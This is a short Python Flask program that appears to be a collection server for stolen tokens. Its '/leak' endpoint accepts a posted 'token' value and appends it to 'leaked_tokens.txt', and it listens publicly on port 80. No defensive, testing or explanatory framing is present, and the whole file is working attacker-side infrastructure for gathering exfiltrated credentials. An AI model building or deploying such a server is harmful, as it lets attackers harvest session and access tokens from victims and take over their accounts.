from flask import Flask, request

app = Flask(__name__)

@app.route('/leak', methods=['POST'])
def leak():
    token = request.form.get('token')
    if token:
        with open('leaked_tokens.txt', 'a') as f:
            f.write(token + '\n')
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
